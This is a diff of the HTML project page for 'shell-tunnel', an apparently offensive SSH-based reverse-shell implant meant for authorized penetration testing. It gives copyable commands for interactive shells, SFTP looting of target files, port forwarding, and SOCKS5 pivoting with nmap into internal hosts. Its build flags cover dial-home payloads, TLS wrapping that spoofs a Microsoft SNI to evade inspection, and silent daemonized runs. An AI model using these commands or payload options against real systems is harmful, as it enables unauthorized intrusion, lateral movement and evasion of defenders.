-        <ul class="ck" aria-label="Checks run">
-            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">In-process integration tests</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">18 tests run the real server in-process on loopback and exercise it with a stock SSH client: password and public key authentication (accept and reject), exec with exit status, a PTY shell, an SFTP round trip, direct-tcpip and remote port forwarding, the rs-info channel, the full dial-home reverse flow and a late-listener retry; the shell fallback has its own unix-only test. They caught a real exit-status race in the original session handler — fixed in this release.</p></li>
-            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">CI on every commit</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">gofmt, <code>go vet</code> and the test suite on ubuntu-24.04, plus a build matrix where ubuntu-24.04, windows-2022 and macos-latest each compile amd64 and arm64 — the six release binaries can never drift from the tree.</p></li>
-        </ul>
-        <ul class="ck" aria-label="More checks">
-            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Build host: Windows 11, Go 1.27</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
-                <p class="why">The same test suite runs on the Windows build host before every merge, so the ConPTY path is exercised for real, not just cross-compiled.</p></li>
-            <li data-state="open"><span class="box" aria-hidden="true"></span><span class="ch">macOS runtime</span><span class="ld" aria-hidden="true"></span><span class="rs">Not run</span>
-                <p class="why">Cross-compiled for aarch64 and x86_64 on every release, unsigned and untested; probably works, no promises. First run needs <code>xattr -d com.apple.quarantine</code> on the binary.</p></li>
-        </ul>
-    </div>
-</section>
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-ok"><span class="k">[shell]</span> 2. INTERACTIVE PTY SESSION</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-pty" aria-label="Copy interactive PTY connect command">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-pty"><span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1</code></pre>
+                                </div>
+                            </div>
 
-<section class="card ref limits" id="issues" aria-labelledby="issues-h">
-    <h2 id="issues-h">Known issues</h2>
-    <ul class="plain">
-        <li>The dial-home side uses <code>InsecureIgnoreHostKey</code>: a payload can't pin a host key it has never seen. Verify the callback out of band — the handler shows the connecting address and the rs-info line names the user and host.</li>
-        <li>Only the initial dial retries. An established callback that drops later is not redialled; run the payload again.</li>
-        <li>TLS wrapping presents a self-signed certificate generated at runtime. It hides the SSH banner from DPI; it does not authenticate the listener to the payload, and payload-to-handler traffic should be treated as resistant to inspection, not to a determined active interceptor.</li>
-        <li>Baked credentials live in the binary. Build per engagement, keep handler scripts (which print the password) to yourself — they are written <code>chmod 700</code> for a reason.</li>
-        <li>Windows builds before Windows 10 17763 have no ConPTY; interactive PTY there needs <code>-s ssh-shellhost.exe</code>, or append <code>cmd</code> to the ssh line for a non-PTY session.</li>
-        <li>Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; <code>SHA256SUMS.txt</code> comes from the same release as the binaries it checks.</li>
-    </ul>
-</section>
+                            <div class="mux-panel-notes">
+                                <h3>Full PTY over stock OpenSSH</h3>
+                                <p>
+                                    Spawns <code>openpty</code> on Linux (falling back to <code>/bin/sh</code> on bash-less hosts) and
+                                    <code>ConPTY</code> on Windows 10 17763+. Tab completion, job control, window resizes, and full-screen
+                                    editors work natively. Standard SSH escape keys remain live: <kbd class="rfs-kbd">~^Z</kbd> backgrounds,
+                                    <kbd class="rfs-kbd">~#</kbd> lists active forwards, and <kbd class="rfs-kbd">~.</kbd> drops the session.
+                                </p>
+                                <div class="rfs-callout is-warn">
+                                    <strong>[!] Host-key flags</strong>
+                                    <code>UserKnownHostsFile=/dev/null</code> and <code>StrictHostKeyChecking=no</code> keep ephemeral keys out of
+                                    <code>~/.ssh/known_hosts</code>, disabling normal host verification. Use only on controlled lab or authorized engagement networks.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 2: SFTP Transfer -->
+                <div class="mux-panel" role="tabpanel" id="panel-sftp" aria-labelledby="tab-sftp" hidden="until-found">
+                    <div class="mux-panel-body">
+                        <div class="mux-panel-grid">
+                            <div class="mux-panel-code">
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-steel"><span class="k">[shell]</span> SFTP OVER MASTER SOCKET</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-sftp" aria-label="Copy SFTP transfer command">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-sftp"><span class="rfs-tok-fn">sftp</span> <span class="rfs-tok-kw">-o</span> ControlPath=<span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-P</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1</code></pre>
+                                </div>
+
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-beacon"><span class="k">[sftp]</span> UPLOAD &amp; DOWNLOAD</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-sftp-ops" aria-label="Copy SFTP put and get examples">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-sftp-ops"><span class="rfs-tok-com"># Inside the interactive sftp prompt</span>
+<span class="rfs-tok-fn">put</span> <span class="rfs-tok-str">./enum.sh</span> <span class="rfs-tok-str">/tmp/enum.sh</span>
+<span class="rfs-tok-fn">get</span> <span class="rfs-tok-str">/etc/hosts</span> <span class="rfs-tok-str">./loot-hosts</span></code></pre>
+                                </div>
+                            </div>
+
+                            <div class="mux-panel-notes">
+                                <h3>Built-in SFTP subsystem</h3>
+                                <p>
+                                    <code>shell-tunnel</code> registers a native Go <code>pkg/sftp</code> subsystem handler right inside the single binary.
+                                    Passing <code>-o ControlPath=/tmp/shell-tunnel-41827.sock</code> reuses the existing ControlMaster session immediately —
+                                    no second password prompt, no Python HTTP server, and no extra files dropped on target just to pull loot or stage tools.
+                                </p>
+                                <div class="rfs-callout is-note">
+                                    <strong>[i] Bind mode shortcut</strong>
+                                    In direct bind mode without a master socket, run <code>sftp -P 8888 svc@&lt;target-ip&gt;</code> straight against the target listener.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 3: -L / -R Forward -->
+                <div class="mux-panel" role="tabpanel" id="panel-fwd" aria-labelledby="tab-fwd" hidden="until-found">
+                    <div class="mux-panel-body">
+                        <div class="mux-panel-grid">
+                            <div class="mux-panel-code">
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-steel"><span class="k">[shell]</span> LOCAL FORWARD (-L) TO INTERNAL HOST</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-l" aria-label="Copy local port forward command">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-l"><span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-O forward -L</span> <span class="rfs-tok-num">8443:10.10.10.50:443</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1</code></pre>
+                                </div>
+
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-beacon"><span class="k">[shell]</span> REMOTE FORWARD (-R) &amp; CLEAN TEARDOWN</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-r" aria-label="Copy remote forward and cancel commands">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-r"><span class="rfs-tok-com"># Expose operator port 9001 on the target host</span>
+<span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-O forward -R</span> <span class="rfs-tok-num">9001:127.0.0.1:9001</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1
+
+<span class="rfs-tok-com"># Remove a single forward without closing the master socket</span>
+<span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-O cancel -L</span> <span class="rfs-tok-num">8443:10.10.10.50:443</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1</code></pre>
+                                </div>
+                            </div>
+
+                            <div class="mux-panel-notes">
+                                <h3>Live TCP port forwarding without dropping your shell</h3>
+                                <p>
+                                    Both <code>direct-tcpip</code> (local <code>-L</code>) and <code>tcpip-forward</code> /
+                                    <code>cancel-tcpip-forward</code> (remote <code>-R</code>) are handled directly inside
+                                    <code>shell-tunnel</code>. Add or cancel forwards on the fly through <code>-O forward</code> and
+                                    <code>-O cancel</code> while keeping your interactive PTY undisturbed.
+                                </p>
+                                <div class="rfs-callout is-tip">
+                                    <strong>[i] Callback catcher lock-down</strong>
+                                    Passing <code>-N</code> on a listener rejects incoming shell, SFTP, and local-forward requests while still permitting reverse <code>tcpip-forward</code> callbacks.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 4: -D SOCKS5 Proxy -->
+                <div class="mux-panel" role="tabpanel" id="panel-socks" aria-labelledby="tab-socks" hidden="until-found">
+                    <div class="mux-panel-body">
+                        <div class="mux-panel-grid">
+                            <div class="mux-panel-code">
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-steel"><span class="k">[shell]</span> OPEN DYNAMIC SOCKS5 PIVOT (-D)</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-socks" aria-label="Copy SOCKS5 dynamic forward command">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-socks"><span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-O forward -D</span> <span class="rfs-tok-num">1080</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1</code></pre>
+                                </div>
+
+                                <div class="rfs-code-card">
+                                    <div class="rfs-code-head">
+                                        <span class="rfs-badge b-ok"><span class="k">[shell]</span> ROUTE TOOLS &amp; CLOSE MASTER</span>
+                                        <button type="button" class="rfs-btn rfs-btn-sm rfs-btn-outline copy-btn" command="--copy" commandfor="cmd-mux-socks-use" aria-label="Copy SOCKS5 usage and exit commands">
+                                            <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-copy"/></svg>
+                                            <span class="copy-label">Copy</span>
+                                        </button>
+                                    </div>
+                                    <pre class="rfs-code-block"><code id="cmd-mux-socks-use"><span class="rfs-tok-com"># Route internal probes through target host via SOCKS5</span>
+<span class="rfs-tok-fn">curl</span> <span class="rfs-tok-kw">--socks5-hostname</span> <span class="rfs-tok-num">127.0.0.1:1080</span> <span class="rfs-tok-str">http://10.10.10.50/</span>
+<span class="rfs-tok-fn">proxychains4</span> <span class="rfs-tok-kw">-q</span> nmap <span class="rfs-tok-kw">-sT -Pn</span> <span class="rfs-tok-num">10.10.10.50</span>
+
+<span class="rfs-tok-com"># Cleanly tear down the master socket when finished</span>
+<span class="rfs-tok-fn">ssh</span> <span class="rfs-tok-kw">-S</span> <span class="rfs-tok-str">/tmp/shell-tunnel-41827.sock</span> <span class="rfs-tok-kw">-O exit</span> <span class="rfs-tok-kw">-p</span> <span class="rfs-tok-num">41827</span> svc@127.0.0.1</code></pre>
+                                </div>
+                            </div>
+
+                            <div class="mux-panel-notes">
+                                <h3>The session is the pivot</h3>
+                                <p>
+                                    OpenSSH translates <code>-D 1080</code> into standard <code>direct-tcpip</code> channels handled by
+                                    <code>shell-tunnel</code>. Point <code>proxychains4</code>, browsers, or CLI tools at
+                                    <code>socks5 127.0.0.1 1080</code> without deploying a separate SOCKS agent on the target.
+                                </p>
+                                <div class="rfs-callout is-note">
+                                    <strong>[i] Forward failure guard</strong>
+                                    Because the master command includes <code>ExitOnForwardFailure=yes</code>, port collisions fail fast instead of leaving a half-open pivot.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== BUILD & RUNTIME FLAGS TABLES ==================== -->
+    <section class="section-band" id="flags" aria-labelledby="flags-title">
+        <div class="section-head">
+            <span class="rfs-badge b-beacon"><span class="k">[ref]</span> VERIFIED AGAINST BUILD.SH &amp; MAIN.GO</span>
+            <h2 class="section-title" id="flags-title">Build &amp; Runtime Flags</h2>
+            <p class="section-lead">
+                Every <code>./build.sh</code> option compiles down to a Go <code>-ldflags</code> variable in <code>main.go</code>
+                so <code>Makefile</code> and manual <code>go build</code> commands share the exact same configuration contract.
+                See <a class="rfs-link-prose" href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/docs/USAGE.md">docs/USAGE.md</a> for extended examples.
+            </p>
+        </div>
+
+        <div class="tables-stack">
+            <div tabindex="0" role="region" aria-labelledby="build-flags-cap" class="rfs-table-wrap flag-table-wrap">
+                <table class="flag-table flag-table-build">
+                    <caption id="build-flags-cap">Build-time options (<code>./build.sh &lt;mode&gt; &lt;target&gt; [options]</code>)</caption>
+                    <thead>
+                        <tr>
+                            <th scope="col">Option</th>
+                            <th scope="col">Makefile / ldflags</th>
+                            <th scope="col">Default</th>
+                            <th scope="col">Behavior</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <th scope="row"><code>reverse &lt;IP:PORT&gt;</code></th>
+                            <td><code>LHOST</code> / <code>LPORT</code></td>
+                            <td><code>""</code> / <code>31337</code></td>
+                            <td>Dial home to listener address (retrying every 5s with 15s SSH keepalives); generates <code>chmod 700</code> handler script</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>listen &lt;PORT&gt;</code></th>
+                            <td><code>LPORT</code></td>
+                            <td><code>31337</code></td>
+                            <td>Bind directly on target port and clear <code>LHOST</code> so binary starts in listening mode</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-u, --user USER</code></th>
+                            <td><code>LUSER</code></td>
+                            <td><code>svc</code></td>
+                            <td>Username used when dialling home and printed in ControlMaster connect commands</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-b, --bind-port PORT</code></th>
+                            <td><code>BPORT</code></td>
+                            <td><code>0</code></td>
+                            <td>Loopback bind port allocated on operator box (<code>0</code> = random; auto-adjusted if equal to <code>LPORT</code>)</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-p, --password PASS</code></th>
+                            <td><code>RS_PASS</code></td>
+                            <td>random 16-hex</td>
+                            <td>Password baked into <code>main.localPassword</code> and verified via constant-time comparison</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-k, --pubkey FILE</code></th>
+                            <td><code>RS_PUB</code></td>
+                            <td><code>""</code></td>
+                            <td>Reads an SSH public key file and bakes it into <code>main.authorizedKey</code></td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-s, --shell PATH</code></th>
+                            <td><code>RS_SHELL</code></td>
+                            <td><code>/bin/bash</code></td>
+                            <td>Default Unix shell (falls back to <code>/bin/sh</code>), or <code>ssh-shellhost.exe</code> path on pre-ConPTY Windows</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>--nocli</code></th>
+                            <td><code>NOCLI=1</code></td>
+                            <td><code>""</code></td>
+                            <td>Disable runtime CLI parsing and silence status output; binary runs strictly from baked-in ldflags</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>--daemonize</code></th>
+                            <td><code>DAEMONIZE=1</code></td>
+                            <td><code>""</code></td>
+                            <td>Auto-detach into background on launch to free interactive delivery shells</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>--tls</code></th>
+                            <td><code>TLS_WRAP=1</code></td>
+                            <td><code>""</code></td>
+                            <td>Wrap SSH inside TLS (<code>h2</code>, <code>http/1.1</code> ALPN) so the SSH banner never crosses the wire in plaintext</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>--sni HOSTNAME</code></th>
+                            <td><code>TLS_SNI</code></td>
+                            <td><code>www.microsoft.com</code></td>
+                            <td>SNI hostname placed in TLS ClientHello and runtime self-signed cert (implies <code>--tls</code>)</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>--dry-run</code> / <code>--show-password</code></th>
+                            <td>wrapper only</td>
+                            <td><code>false</code></td>
+                            <td>Preview <code>make</code> variables and output paths without compiling, or always display the baked password</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div tabindex="0" role="region" aria-labelledby="runtime-flags-cap" class="rfs-table-wrap flag-table-wrap">
+                <table class="flag-table flag-table-runtime">
+                    <caption id="runtime-flags-cap">Runtime binary flags (available when compiled without <code>--nocli</code>)</caption>
+                    <thead>
+                        <tr>
+                            <th scope="col">Flag</th>
+                            <th scope="col">Default</th>
+                            <th scope="col">Behavior</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <th scope="row"><code>-l</code></th>
+                            <td><code>false</code></td>
+                            <td>Start in listening mode (overrides baked reverse target)</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-p PORT</code></th>
+                            <td><code>LPORT</code> (<code>31337</code>)</td>
+                            <td>Listening port in bind mode, or remote handler port in reverse mode</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-b PORT</code></th>
+                            <td><code>BPORT</code> (<code>0</code>)</td>
+                            <td>Reverse mode only: loopback bind port requested on the handler (<code>0</code> = random)</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-s PATH</code></th>
+                            <td><code>/bin/bash</code></td>
+                            <td>Shell to spawn on Unix, or <code>ssh-shellhost.exe</code> path on pre-Windows 10 17763</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-d</code></th>
+                            <td><code>false</code></td>
+                            <td>Detach and continue running in the background</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-N</code></th>
+                            <td><code>false</code></td>
+                            <td>Deny incoming shell, exec, SFTP, and local forward requests (hardened callback catcher)</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-v</code></th>
+                            <td><code>false</code></td>
+                            <td>Emit <code>[i]</code> progress lines alongside <code>[ok]</code>/<code>[!]</code>/<code>[x]</code> output; honors <code>NO_COLOR</code> and pipes</td>
+                        </tr>
+                        <tr>
+                            <th scope="row"><code>-V, --version</code></th>
+                            <td>—</td>
+                            <td>Print <code>shell-tunnel v1.4.2</code> and exit <code>0</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== PLATFORM SUPPORT & KNOWN ISSUES GRID ==================== -->
+    <section class="section-band" id="platforms" aria-label="Platform support and known issues">
+        <div class="arch-grid">
+            <article class="arch-pane" aria-labelledby="platforms-title">
+                <span class="rfs-badge b-ok"><span class="k">[ci]</span> 6 RELEASE TARGETS · 18 TESTS</span>
+                <h2 class="pane-title" id="platforms-title">Platform Support</h2>
+                <p class="pane-intro">
+                    Zero-CGO static binaries compile on every commit across Linux, Windows, and macOS in CI.
+                    18 in-process integration tests exercise the real server on loopback against a stock SSH client.
+                </p>
+
+                <dl class="platform-list">
+                    <div class="platform-row">
+                        <dt>
+                            <span class="platform-name">Linux</span>
+                            <span class="rfs-badge b-ok"><span class="k">[ok]</span> TESTED</span>
+                        </dt>
+                        <dd>
+                            <p class="platform-arch"><code>x86_64</code> · <code>aarch64</code> release tarballs (+ <code>linux-x86</code> via <code>build.sh</code>)</p>
+                            <p class="platform-detail">Full <code>openpty</code> terminal allocation with resize tracking and automatic fallback to <code>/bin/sh</code>. Verified on <code>ubuntu-24.04</code> CI.</p>
+                        </dd>
+                    </div>
+                    <div class="platform-row">
+                        <dt>
+                            <span class="platform-name">Windows</span>
+                            <span class="rfs-badge b-ok"><span class="k">[ok]</span> TESTED</span>
+                        </dt>
+                        <dd>
+                            <p class="platform-arch"><code>x86_64</code> · <code>aarch64</code> release zips (+ <code>windows-x86.exe</code> via <code>build.sh</code>)</p>
+                            <p class="platform-detail">Native <code>ConPTY</code> on Windows 10 17763+ tested live on Windows 11 and <code>windows-2022</code> CI. Legacy Windows supports <code>-s ssh-shellhost.exe</code>.</p>
+                        </dd>
+                    </div>
+                    <div class="platform-row">
+                        <dt>
+                            <span class="platform-name">macOS</span>
+                            <span class="rfs-badge b-warn"><span class="k">[!]</span> BUILD ONLY</span>
+                        </dt>
+                        <dd>
+                            <p class="platform-arch"><code>aarch64</code> · <code>x86_64</code> release tarballs (<code>macos-latest</code> CI)</p>
+                            <p class="platform-detail">Cross-compiled on every tagged release, unsigned, and not exercised at runtime. First run requires clearing quarantine: <code>xattr -d com.apple.quarantine ./shell-tunnel</code>.</p>
+                        </dd>
+                    </div>
+                </dl>
+            </article>
+
+            <article class="arch-pane pane-limits" id="issues" aria-labelledby="issues-title">
+                <span class="rfs-badge b-fail"><span class="k">[!]</span> OPERATIONAL LIMITS</span>
+                <h2 class="pane-title" id="issues-title">Known Issues</h2>
+                <p class="pane-intro">
+                    Plain trade-offs to weigh before deploying on an authorized engagement. Verify release artifacts against
+                    <code>SHA256SUMS.txt</code> published alongside each tag.
+                </p>
+
+                <ul class="issue-list">
+                    <li>
+                        <span class="issue-tag st-warn">[!]</span>
+                        <div>
+                            <strong>Unsigned binaries &amp; AV/Gatekeeper alerts:</strong>
+                            No release binary is code-signed. Windows SmartScreen, Defender/EDR static detections, and macOS Gatekeeper blocks are expected on first run.
+                        </div>
+                    </li>
+                    <li>
+                        <span class="issue-tag st-warn">[!]</span>
+                        <div>
+                            <strong>No host-key pinning on dial-home:</strong>
+                            Reverse payloads use <code>InsecureIgnoreHostKey</code> because they cannot know an ephemeral handler's key ahead of time. Verify callbacks out of band via remote IP and the <code>rs-info</code> user/host line.
+                        </div>
+                    </li>
+                    <li>
+                        <span class="issue-tag st-warn">[!]</span>
+                        <div>
+                            <strong>Initial dial retry only:</strong>
+                            Dial-home retries every 5s until the handler answers, and sends 15s keepalives once connected. If an established callback drops later, it does not redial — relaunch the payload.
+                        </div>
+                    </li>
+                    <li>
+                        <span class="issue-tag st-warn">[!]</span>
+                        <div>
+                            <strong>Self-signed runtime TLS certificate:</strong>
+                            <code>--tls</code> hides the SSH banner from DPI, but does not authenticate the listener against an active interceptor.
+                        </div>
+                    </li>
+                    <li>
+                        <span class="issue-tag st-warn">[!]</span>
+                        <div>
+                            <strong>Credentials live inside the binary:</strong>
+                            Passwords and authorized keys are embedded via ldflags. Rebuild per engagement and keep <code>chmod 700</code> handler scripts private.
+                        </div>
+                    </li>
+                    <li>
+                        <span class="issue-tag st-warn">[!]</span>
+                        <div>
+                            <strong>Pre-Windows 10 17763 targets:</strong>
+                            Hosts without ConPTY need <code>-s ssh-shellhost.exe</code> for interactive PTY, or append <code>cmd</code> to the <code>ssh</code> invocation for a non-PTY shell.
+                        </div>
+                    </li>
+                </ul>
+            </article>
+        </div>
+    </section>
+
 </main>
 
-<footer class="wrap foot">
-    <p>GPLv3 — fork of Ferdinor's undertow (2021). For authorized security testing with explicit written permission only.</p>
-    <p><a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/docs/USAGE.md">Usage</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
+<footer class="wrap site-footer">
+    <p class="foot-copy">GPLv3 — fork of Ferdinor's undertow (2021). For authorized security testing with explicit written permission only.</p>
+    <nav class="foot-links" aria-label="Footer">
+        <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">Source</a>
+        <span aria-hidden="true">·</span>
+        <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/docs/USAGE.md">Usage</a>
+        <span aria-hidden="true">·</span>
+        <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/releases/latest">Releases</a>
+        <span aria-hidden="true">·</span>
+        <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/CHANGELOG.md">Changelog</a>
+        <span aria-hidden="true">·</span>
+        <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/SECURITY.md">Security</a>
+        <span aria-hidden="true">·</span>
+        <a href="https://real-fruit-snacks.github.io/">RFS</a>
+    </nav>
 </footer>
 </div>
 
-<div id="rfs-toast" class="rfs-toast is-ok" popover="manual" role="status" aria-live="polite"></div>
+<div id="rfs-toast" class="rfs-toast is-ok" popover="manual" role="status" aria-live="polite">
+    <span class="toast-body" id="rfs-toast-body"></span>
+    <button type="button" class="rfs-toast-close" popovertarget="rfs-toast" popovertargetaction="hide" aria-label="Dismiss notification">
+        <svg class="rfs-icon rfs-icon-sm" aria-hidden="true"><use href="rfs-icons.svg#rfs-i-close"/></svg>
+    </button>
+</div>
+
 <script src="script.js"></script>
 </body>
 </html>
